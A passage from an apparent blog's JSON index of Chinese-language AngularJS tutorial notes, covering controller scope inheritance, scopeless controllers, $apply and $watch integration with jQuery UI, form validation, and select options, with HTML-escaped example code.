src=\"angular.js\"&gt;&lt;/script&gt; &lt;script src=\"controllers.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt;&lt;/head&gt;&lt;body ng-controller=\"topLevelCtrl\"&gt; &lt;div class=\"well\"&gt; &lt;h4&gt;Top Level Controller&lt;/h4&gt; &lt;div class=\"input-group\"&gt; &lt;span class=\"input-group-btn\"&gt; &lt;button class=\"btn btn-default\" type=\"button\" ng-click=\"reverseText()\"&gt;Reverse&lt;/button&gt; &lt;button class=\"btn btn-default\" type=\"button\" ng-click=\"changeCase()\"&gt;Case&lt;/button&gt; &lt;/span&gt; &lt;input class=\"form-control\" ng-model=\"dataValue\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"well\" ng-controller=\"firstChildCtrl\"&gt; &lt;h4&gt;First Child Controller&lt;/h4&gt; &lt;div class=\"input-group\"&gt; &lt;span class=\"input-group-btn\"&gt; &lt;button class=\"btn btn-default\" type=\"button\" ng-click=\"reverseText()\"&gt;Reverse&lt;/button&gt; &lt;button class=\"btn btn-default\" type=\"button\" ng-click=\"changeCase()\"&gt;Case&lt;/button&gt; &lt;/span&gt; &lt;input class=\"form-control\" ng-model=\"dataValue\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"well\" ng-controller=\"secondChildCtrl\"&gt; &lt;h4&gt;Second Child Controller&lt;/h4&gt; &lt;div class=\"input-group\"&gt; &lt;span class=\"input-group-btn\"&gt; &lt;button class=\"btn btn-default\" type=\"button\" ng-click=\"reverseText()\"&gt;Reverse&lt;/button&gt; &lt;button class=\"btn btn-default\" type=\"button\" ng-click=\"changeCase()\"&gt;Case&lt;/button&gt; &lt;button class=\"btn btn-default\" type=\"button\" ng-click=\"shiftFour()\"&gt;Shift&lt;/button&gt; &lt;/span&gt; &lt;input class=\"form-control\" ng-model=\"dataValue\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 1234567891011121314151617181920212223242526272829303132333435363738394041var app = angular.module(\"exampleApp\", []);app.controller(\"topLevelCtrl\", function ($scope) &#123; $scope.dataValue = \"Hello, Adam\"; $scope.reverseText = function () &#123; $scope.dataValue = $scope.dataValue.split(\"\").reverse().join(\"\"); &#125; $scope.changeCase = function () &#123; var result = []; angular.forEach($scope.dataValue.split(\"\"), function (char, index) &#123; result.push(index % 2 == 1 ? char.toString().toUpperCase() : char.toString().toLowerCase()); &#125;); $scope.dataValue = result.join(\"\"); &#125;;&#125;);app.controller(\"firstChildCtrl\", function ($scope) &#123; $scope.changeCase = function () &#123; $scope.dataValue = $scope.dataValue.toUpperCase(); &#125;;&#125;);app.controller(\"secondChildCtrl\", function ($scope) &#123; $scope.changeCase = function () &#123; $scope.dataValue = $scope.dataValue.toLowerCase(); &#125;; $scope.shiftFour = function () &#123; var result = []; angular.forEach($scope.dataValue.split(\"\"), function (char, index) &#123; result.push(index &lt; 4 ? char.toUpperCase() : char); &#125;); $scope.dataValue = result.join(\"\"); &#125;&#125;); 通过上例可看到，三个控制器都提供Reverse按钮用于反转输入框元素字符顺序，当通过ng-controller指令将控制器嵌入另一个控制器中时，子控制器的作用域便继承父控制器作用域中的数据和行为。 这些输入框元素都被连接到dataValue属性上，都调用reverseText方法，由于属性和方法都是都顶层控制器中被定义，即使在子控制器中单击reverse按钮，顶层输入框也会改变。 覆盖和扩展继承的数据和行为：由于子控制器能够覆盖他们父控制机中的数据和行为，即数据和方法名能被同名的局部数据和行为覆盖，可以看到每个子控制器都在自己的作用域定义了名为changeCase的行为，这些行为的实现不同，所以，点击调用时的反馈就不一样。 这种覆盖和扩展机制是符合js本身的语言特性的，这允许只改写需要自定义的部分，为不同部分定制控制器。 数据继承的问题：这个demo显示了一种独特的情况(bug?)，若只修改第一个top level中的输入框，则所有输入框都会更新，同是点击三个reverse的结果都是一样的：三个输入框都会改变。 但是若单独修改了第二个或第三个输入框，则会发现reverse“失效”了，只能控制第一个输入框的值了。 即，被编辑后的输入框似乎独立了，一个同名变量名覆盖了父作用域中的变量（其实是由于js的原型继承）。 无作用域的控制器若一个应用不需要继承，也不需要在控制器之间通信，则可选择使用无作用域的控制器，而取代作用域为视图提供数据和行为的是一个特殊变量，该变量代表了控制器本身。123456789101112131415161718192021222324252627282930&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Controllers&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; var app = angular.module(\"exampleApp\", []) .controller(\"simpleCtrl\", function () &#123; this.dataValue = \"Hello, Adam\"; this.reverseText = function () &#123; this.dataValue = this.dataValue.split(\"\").reverse().join(\"\"); &#125; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"well\" ng-controller=\"simpleCtrl as ctrl\"&gt; &lt;h4&gt;Top Level Controller&lt;/h4&gt; &lt;div class=\"input-group\"&gt; &lt;span class=\"input-group-btn\"&gt; &lt;button class=\"btn btn-default\" type=\"button\" ng-click=\"ctrl.reverseText()\"&gt;Reverse&lt;/button&gt; &lt;/span&gt; &lt;input class=\"form-control\" ng-model=\"ctrl.dataValue\"&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 上例的控制器没有声明对$scope的依赖，而是通过js的关键字this定义了自己的数据和行为。 当使用无作用域的控制器时，ng-controller指令的表达式又一些不同，需要指定一个代表控制器的变量名（上例为ctrl） 显示更新作用域有的时候需要显示更新作用域，例如将ng与其他js框架集成使用时，ng提供了一些方法能够注册响应作用域上变化的函数，以及从ng代码之外向改变作用域内的数据。 $apply(expression) 更新作用域 $watch(expression, handler) 注册一个函数，当expression表达式所引用的值变化时，该函数会被调用 $watchCollection(object, handler) 注册一个函数，当object对象的任何属性变化时，该函数会被调用 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Controllers&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script src=\"//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js\"&gt;&lt;/script&gt; &lt;script src=\"//ajax.googleapis.com/ajax/libs/jqueryui/1.10.3/jquery-ui.min.js\"&gt; &lt;/script&gt; &lt;link rel=\"stylesheet\" href= \"http://ajax.googleapis.com/ajax/libs/jqueryui/1.10.3/themes/sunny/jquery-ui.min.css\"&gt; &lt;script&gt; $(document).ready(function () &#123; $('#jqui button').button().click(function (e) &#123; angular.element(angularRegion).scope().$apply('handleClick()'); &#125;); &#125;); var app = angular.module(\"exampleApp\", []) .controller(\"simpleCtrl\", function ($scope) &#123; $scope.buttonEnabled = true; $scope.clickCounter = 0; $scope.handleClick = function () &#123; $scope.clickCounter++; &#125; $scope.$watch('buttonEnabled', function (newValue) &#123; $('#jqui button').button(&#123; disabled: !newValue &#125;); &#125;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"angularRegion\" class=\"well\" ng-controller=\"simpleCtrl\"&gt; &lt;h4&gt;AngularJS&lt;/h4&gt; &lt;div class=\"checkbox\"&gt; &lt;label&gt; &lt;input type=\"checkbox\" ng-model=\"buttonEnabled\"&gt; Enable Button &lt;/label&gt; &lt;/div&gt; Click counter: &#123;&#123;clickCounter&#125;&#125; &lt;/div&gt; &lt;div id=\"jqui\" class=\"well\"&gt; &lt;h4&gt;jQuery UI&lt;/h4&gt; &lt;button&gt;Click Me!&lt;/button&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; See the Pen 显式更新作用域 by XmoyKing (@xmoyking) on CodePen. $watch方法提供对外集成的手段，作用域上某个变化可以出发调用其他框架中响应变化，注册了对buttonEnabled属性的监听，在其内使用了jq的方式更新元素的状态。 而在jQuery的作用域内，需要通过ng找到控制器元素所关联的作用域，然后才能使用ng中控制器定义的方法，通过$apply来调用handleClick(注意这里传入的是一个表达式字符串)，然后修改clickCounter变量值，也可以通过一个修改clickCounter变量的表达式来达到目的。1angular.element(angularRegion).scope().$apply('clickCounter += 1'); 但使用方法比较好，因为这样能保持调用逻辑的统一和方便维护。","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs入门笔记-14-表单","slug":"angularjs14","date":"2017-05-20T03:07:57.000Z","updated":"2017-12-06T14:50:08.868Z","comments":true,"path":"2017/05/20/angularjs14/","link":"","permalink":"https://github.com/xmoyKING/2017/05/20/angularjs14/","excerpt":"","text":"绝大多数Web应用必不可少的就是表单了，ng对表单提供了从数据绑定到验证的不同程度的支持，提供一些额外的属性对表单增强。 form元素的novalidate属性，使用特殊变量($valid)可得到某个元素或整个表单的有效性。 提供校验结果的视觉提示，使用ng校验器的css类 延迟校验反馈，可添加锁住校验反馈的变量 对input元素执行复杂校验 使用ng-true-value和ng-false-value属性，通过复选框绑定控制模型属性值 校验textarea元素 通过ng-option对select元素生成option选项 除了创建控制器时，对显示定义的模型属性进行操作，通过双向数据绑定会隐式的在数据模型中创建新的对象或属性，这种特性在使用表单元素收集信息时非常有用。 添加新对象到模型如下demo就使用隐式创建的方式创建新对象到模型中。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Forms&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope) &#123; $scope.todos = [ &#123; action: \"Get groceries\", complete: false &#125;, &#123; action: \"Call plumber\", complete: false &#125;, &#123; action: \"Buy running shoes\", complete: true &#125;, &#123; action: \"Buy flowers\", complete: false &#125;, &#123; action: \"Call family\", complete: false &#125;]; $scope.addNewItem = function (newItem) &#123; $scope.todos.push(&#123; action: newItem.action + \" (\" + newItem.location + \")\", complete: false &#125;); &#125;; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"todoPanel\" class=\"panel\" ng-controller=\"defaultCtrl\"&gt; &lt;h3 class=\"panel-header\"&gt; To Do List &lt;span class=\"label label-info\"&gt; &#123;&#123; (todos | filter: &#123;complete: 'false'&#125;).length&#125;&#125; &lt;/span&gt; &lt;/h3&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col-xs-6\"&gt; &lt;div class=\"well\"&gt; &lt;div class=\"form-group row\"&gt; &lt;label for=\"actionText\"&gt;Action:&lt;/label&gt; &lt;input id=\"actionText\" class=\"form-control\" ng-model=\"newTodo.action\"&gt; &lt;/div&gt; &lt;div class=\"form-group row\"&gt; &lt;label for=\"actionLocation\"&gt;Location:&lt;/label&gt; &lt;select id=\"actionLocation\" class=\"form-control\" ng-model=\"newTodo.location\"&gt; &lt;option&gt;Home&lt;/option&gt; &lt;option&gt;Office&lt;/option&gt; &lt;option&gt;Mall&lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;button class=\"btn btn-primary btn-block\" ng-click=\"addNewItem(newTodo)\"&gt; Add &lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"col-xs-6\"&gt; &lt;table class=\"table\"&gt; &lt;thead&gt; &lt;tr&gt;&lt;th&gt;#&lt;/th&gt;&lt;th&gt;Action&lt;/th&gt;&lt;th&gt;Done&lt;/th&gt;&lt;/tr&gt; &lt;/thead&gt; &lt;tr ng-repeat=\"item in todos\"&gt; &lt;td&gt;&#123;&#123;$index + 1&#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123;item.action&#125;&#125;&lt;/td&gt; &lt;td&gt; &lt;input type=\"checkbox\" ng-model=\"item.complete\"&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 在上述示例中在input上绑定了一个newTodo.action，在select上绑定newTodo.location，然后在button上绑定点击事件，将newTodo对象传入addNewItem函数中。 在控制器中的addNewItem函数，虽然可以通过直接访问$scope.newTodo实现添加新任务，而不是接收一个对象作为参数，看似多此一举，但实际上，接收对象参数的方法能在视图中多次复用，尤其是在需要考虑到控制器的继承关系时非常重要。 在页面被初次加载时，newTodo对象以及action和location属性并不存在，模型中仅有的数据是已有的待办事项，这些数据是控制器函数中硬编码写死的。 而在input元素或selcet元素改变时，ng将自动创建newTodo对象并能更新这个对象，ng这种灵活创建新对象和属性的方式非常有利于快速开发并修改模型，以简洁的方式调用并处理数据。 但这种隐式创建对象的方式也有问题，比如若一开始没有输入也没有选择的时候直接点击add按钮，会报错：1TypeError: Cannot read property 'action' of undefined 这种问题就是由于控制器中的方法函数视图访问一个ng尚未创建出的对象的属性导致的，而对象只有在（即输入框、选择框被改变后）触发双向绑定指令后才能被创建，考虑到这种情况（编写程序时很大可能不会考虑到），需要对方法参数进行检查。12345678910$scope.addNewItem = function (newItem) &#123; if (angular.isDefined(newItem) &amp;&amp; angular.isDefined(newItem.action) &amp;&amp; angular.isDefined(newItem.location)) &#123; $scope.todos.push(&#123; action: newItem.action + \" (\" + newItem.location + \")\", complete: false &#125;); &#125;&#125;; 其实更好的方法是对表单进行校验，尤其是程序在使用用户输入的数据之前需要进行检查。这里需要提到一些用户交互和体验以及程序功能上的平衡或取舍问题。 为什么用户会输入错误的数据？数据输入不合理，很多时候其实算是开发者的锅，很多数据不规则的问题在一定程度上可通过细致的设计和开发来避免。 用户不理解要求输入的是什么，这种情况往往是由于提示不够明确，或仅仅是用户没有注意到。为了减少用户的混淆和疏忽，可采取一些方法，比如尽可能早的要求填写那些必要的信息，同时组织表单减少混淆，让标签语义更清晰，遵循一些表单元素的惯用顺序等。 用户不想提供要求的数据，比如一些用户想尽快完成填表，输入尽量少的数据，或者就不愿提供精确的数据，比如一些私人信息。 用户没有该要求的数据，比如地区，有一些地区分为三级，但是该用户所在地区只有两级，没有第三级。 仅仅是简简单单的用户输入错误，这种情况其实最常见，只要是需要输入的地方，都有可能输入错误数据，这种情况应该考虑如何有效减少用户输入而不是处理这种错误。 如下验证表单的示例：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Forms&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope) &#123; $scope.addUser = function (userDetails) &#123; $scope.message = userDetails.name + \" (\" + userDetails.email + \") (\" + userDetails.agreed + \")\"; &#125; $scope.message = \"Ready\"; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"todoPanel\" class=\"panel\" ng-controller=\"defaultCtrl\"&gt; &lt;form name=\"myForm\" novalidate ng-submit=\"addUser(newUser)\"&gt; &lt;div class=\"well\"&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;Name:&lt;/label&gt; &lt;input name=\"userName\" type=\"text\" class=\"form-control\" required ng-model=\"newUser.name\"&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;Email:&lt;/label&gt; &lt;input name=\"userEmail\" type=\"email\" class=\"form-control\" required ng-model=\"newUser.email\"&gt; &lt;/div&gt; &lt;div class=\"checkbox\"&gt; &lt;label&gt; &lt;input name=\"agreed\" type=\"checkbox\" ng-model=\"newUser.agreed\" required&gt; I agree to the terms and conditions &lt;/label&gt; &lt;/div&gt; &lt;button type=\"submit\" class=\"btn btn-primary btn-block\" ng-disabled=\"myForm.$invalid\"&gt; OK &lt;/button&gt; &lt;/div&gt; &lt;div class=\"well\"&gt; Message: &#123;&#123;message&#125;&#125; &lt;div&gt; Valid: &#123;&#123;myForm.$valid&#125;&#125; &lt;/div&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 上述demo在浏览器加载的时候OK按钮是被禁用的，只有文本框内输入合法的值（邮箱会被验证）并勾选复选框后Ok按钮才会变为可用可点击状态，允许用户提交表单。 要向通过ng处理到form元素，并自动设置一些表单元素的校验工作，需要设置一些属性，比如form表单的name属性。 form表单元素其实只是在表单校验的时候需要，若是普通的双向绑定，即使不用form元素也没问题。 ng使用标准html元素来配置表单校验，但是由于浏览器对这些标准html属性的行为不一致，所以需要先使用novalidate属性禁用表单的默认验证，这个属性是定义在html5规范中的，表示不需要浏览器验证表单。 ng-submit指令为表单提交事件指定响应行为，将在表单提交时触发。 input元素的type值类型： checkbox 复选框 radio 单选框 text 文本 email 邮件,H5加入 number 数值,H5加入 url URL地址,H5加入 ng用一些特殊变量来增强表单元素，可以这些变量检查表单的单个元素或者整体有效性 $pristine 若用户没有与元素/表单交互返回true $dirty 若用户与元素/表单交互返回true $valid 当元素/表单的校验有效返回true $invalid 当元素/表单校验无效返回true $error 提供校验错误的详细信息 两种ng校验信息展示方法ng为报告实时校验信息提供两种机制：css类和变量。 ng校验用到的css类，当符合规则时，ng将自动添加如下的css类名到元素/表单上： ng-pristine 若用户没有与元素/表单交互 ng-dirty 若用户与元素/表单交互 ng-valid 当元素/表单的校验有效 ng-invalid 当元素/表单校验无效 只要使用ng去验证，所以可以直接定义css规则即可展示不同状态的表单，也可以配合ng-class指令使用。 在ng中，使用变量作为验证信息展示媒介时，使用表单验证一定要添加name值，无论是表单还是元素，因为ng是通过name属性来自动获取该元素的，比如myForm.userEmail.$error.email 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Forms&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope) &#123; $scope.addUser = function (userDetails) &#123; $scope.message = userDetails.name + \" (\" + userDetails.email + \") (\" + userDetails.agreed + \")\"; &#125; $scope.message = \"Ready\"; &#125;); &lt;/script&gt; &lt;style&gt; form .ng-invalid-required.ng-dirty &#123; background-color: lightpink; &#125; form .ng-invalid-email.ng-dirty &#123; background-color: lightgoldenrodyellow; &#125; form .ng-valid.ng-dirty &#123; background-color: lightgreen; &#125; span.summary.ng-invalid &#123; color: red; font-weight: bold; &#125; span.summary.ng-valid &#123; color: green; &#125; div.error &#123;color: red; font-weight: bold;&#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"todoPanel\" class=\"panel\" ng-controller=\"defaultCtrl\"&gt; &lt;form name=\"myForm\" novalidate ng-submit=\"addUser(newUser)\"&gt; &lt;div class=\"well\"&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;Email:&lt;/label&gt; &lt;input name=\"userEmail\" type=\"email\" class=\"form-control\" required ng-model=\"newUser.email\"&gt; &lt;div class=\"error\" ng-show=\"myForm.userEmail.$invalid &amp;&amp; myForm.userEmail.$dirty\"&gt; &lt;span ng-show=\"myForm.userEmail.$error.email\"&gt; Please enter a valid email address &lt;/span&gt; &lt;span ng-show=\"myForm.userEmail.$error.required\"&gt; Please enter a value &lt;/span&gt; &lt;/div&gt; &lt;/div&gt; &lt;button type=\"submit\" class=\"btn btn-primary btn-block\" ng-disabled=\"myForm.$invalid\"&gt;OK&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 上述变量方法将所有错误的类型和提示信息都提前写入到html中，这样不是很好看，而且很冗余，不方便，这时，就可以通过控制器将这些验证提示信息整合起来。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Forms&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope) &#123; $scope.addUser = function (userDetails) &#123; $scope.message = userDetails.name + \" (\" + userDetails.email + \") (\" + userDetails.agreed + \")\"; &#125; $scope.message = \"Ready\"; $scope.getError = function (error) &#123; if (angular.isDefined(error)) &#123; if (error.required) &#123; return \"Please enter a value\"; &#125; else if (error.email) &#123; return \"Please enter a valid email address\"; &#125; &#125; &#125; &#125;); &lt;/script&gt; &lt;style&gt; form .ng-invalid-required.ng-dirty &#123; background-color: lightpink; &#125; form .ng-invalid-email.ng-dirty &#123; background-color: lightgoldenrodyellow; &#125; form .ng-valid.ng-dirty &#123; background-color: lightgreen; &#125; span.summary.ng-invalid &#123; color: red; font-weight: bold; &#125; span.summary.ng-valid &#123; color: green; &#125; div.error &#123;color: red; font-weight: bold;&#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"todoPanel\" class=\"panel\" ng-controller=\"defaultCtrl\"&gt; &lt;form name=\"myForm\" novalidate ng-submit=\"addUser(newUser)\"&gt; &lt;div class=\"well\"&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;Email:&lt;/label&gt; &lt;input name=\"userEmail\" type=\"email\" class=\"form-control\" required ng-model=\"newUser.email\"&gt; &lt;div class=\"error\" ng-show=\"myForm.userEmail.$invalid &amp;&amp; myForm.userEmail.$dirty\"&gt; &#123;&#123;getError(myForm.userEmail.$error)&#125;&#125; &lt;/div&gt; &lt;/div&gt; &lt;button type=\"submit\" class=\"btn btn-primary btn-block\" ng-disabled=\"myForm.$invalid\"&gt;OK&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 直到现在，ng提供了一种实时验证的方法，每当用户与表单交互时就会验证，这种方式其实并不是特别常用，因为这会让用户被验证信息弄得很烦。 这时，可以考虑使用不直接将验证情况反馈出来，而是通过ng-class在form上绑定一个ng-invalid的类，然后在submit时在去显示验证信息。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Forms&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope) &#123; $scope.addUser = function (userDetails) &#123; if (myForm.$valid) &#123; $scope.message = userDetails.name + \" (\" + userDetails.email + \") (\" + userDetails.agreed + \")\"; &#125; else &#123; $scope.showValidation = true; &#125; &#125; $scope.message = \"Ready\"; $scope.getError = function (error) &#123; if (angular.isDefined(error)) &#123; if (error.required) &#123; return \"Please enter a value\"; &#125; else if (error.email) &#123; return \"Please enter a valid email address\"; &#125; &#125; &#125; &#125;); &lt;/script&gt; &lt;style&gt; form.validate .ng-invalid-required.ng-dirty &#123; background-color: lightpink; &#125; form.validate .ng-invalid-email.ng-dirty &#123; background-color: lightgoldenrodyellow; &#125; div.error &#123; color: red; font-weight: bold; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"todoPanel\" class=\"panel\" ng-controller=\"defaultCtrl\"&gt; &lt;form name=\"myForm\" novalidate ng-submit=\"addUser(newUser)\" ng-class=\"showValidation ? 'validate' : ''\"&gt; &lt;div class=\"well\"&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;Email:&lt;/label&gt; &lt;input name=\"userEmail\" type=\"email\" class=\"form-control\" required ng-model=\"newUser.email\"&gt; &lt;div class=\"error\" ng-show=\"showValidation\"&gt; &#123;&#123;getError(myForm.userEmail.$error)&#125;&#125; &lt;/div&gt; &lt;/div&gt; &lt;button type=\"submit\" class=\"btn btn-primary btn-block\"&gt;OK&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; ng在input元素上提供了额外的属性： ng-change 指定表达式，当元素内容改变时计算求值 ng-minlength 最小字符数 ng-maxlength ng-pattern 将内容用正则表达式验证 ng-required 通过数据绑定required属性值注，当type属性设置为email，number，url时就不用设置ng-pattern了 当type为checkbox时，ng提供的额外属性 ng-true-value 被勾选时绑定表达式的值 ng-false-value 取消勾选时绑定表达式的值 关于select的使用select有一些特别需要注意的地方，这一点与其他表单元素不同，需要特殊对待12345678910111213141516171819202122232425262728293031323334353637&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Forms&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope) &#123; $scope.todos = [ &#123; id: 100, action: \"Get groceries\", complete: false &#125;, &#123; id: 200, action: \"Call plumber\", complete: false &#125;, &#123; id: 300, action: \"Buy running shoes\", complete: true &#125;]; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"todoPanel\" class=\"panel\" ng-controller=\"defaultCtrl\"&gt; &lt;form name=\"myForm\" novalidate&gt; &lt;div class=\"well\"&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;Select an Action:&lt;/label&gt; &lt;select ng-model=\"selectValue\" ng-options=\"item.id as item.action for item in todos\"&gt; &lt;option value=\"\"&gt;(Pick One)&lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"well\"&gt; &lt;p&gt;Selected: &#123;&#123;selectValue || 'None'&#125;&#125;&lt;/p&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; select中的&lt;option value=&quot;&quot;&gt;(Pick One)&lt;/option&gt;是作为默认选项存在的 同时select也提供了分组功能，只要修改迭代即可1item.id as item.action group by item.place for item in todos","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs入门笔记-13-元素和事件指令","slug":"angularjs13","date":"2017-05-18T00:41:45.000Z","updated":"2017-12-06T14:50:08.868Z","comments":true,"path":"2017/05/18/angularjs13/","link":"","permalink":"https://github.com/xmoyKING/2017/05/18/angularjs13/","excerpt":"","text":"学习用于在Dom中添加，删除，隐藏和显示元素的指令，以及从类中添加，删除元素并设置css样式属性，处理事件的指令，以及映射指令。 对元素设置 ng-show和ng-hide， 显示或隐藏元素 ng-if， 从dom删除元素 带过滤器的ng-repeat， 在生成没有直接父元素的元素时避免嵌入包含问题 ng-class和ng-style，将元素添加到css类中，或设置某个css属性 ng-class-odd或ng-class-even， 对ng-repeat指令生成的奇数或偶数行添加不同的css类 ng-click等事件指令， 定义某事件被触发时执行的行为 自定义事件指令， 处理ng未提供的指令事件 ng-checked布尔属性指令， 对元素使用布尔属性 表格条纹化（隔行换色）问题以及ng-repeat冲突问题：12345678910&lt;table class=\"table table-striped\"&gt; &lt;thead&gt; &lt;tr&gt;&lt;th&gt;#&lt;/th&gt;&lt;th&gt;Action&lt;/th&gt;&lt;th&gt;Done&lt;/th&gt;&lt;/tr&gt; &lt;/thead&gt; &lt;tr ng-repeat=\"item in todos\" ng-hide=\"item.complete\"&gt; &lt;td&gt;&#123;&#123;$index + 1&#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123;item.action&#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123;item.complete&#125;&#125;&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; 123table.table.table-striped tr:nth-child(odd) td &#123; background-color: moccasin;&#125; ng-show、ng-hide指令在应用到ng-repeat生成的表格元素的时候会有一些问题，正常情况下通过css设置条纹效果，由于将ng-hide用在tr上，而元素是被隐藏而不是移除，所以会出现条纹不一致。似乎可以使用ng-if解决这个问题，但是ng-repeat也应用在tr上，所以会和ng-if冲突，因为两种指令都依赖ng称为嵌入包含的技术，所以会冲突，即ng-repeat和ng-if无法同时用在一个元素上。 这种情况下可以通过过滤器来解决：1&lt;tr ng-repeat=\"item in todos | filter: &#123;complete: 'false'&#125;\"&gt; 使用ng-class和ng-style, 将元素添加到类中或设置css属性123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Directives&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope) &#123; $scope.todos = [ &#123; action: \"Get groceries\", complete: false &#125;, 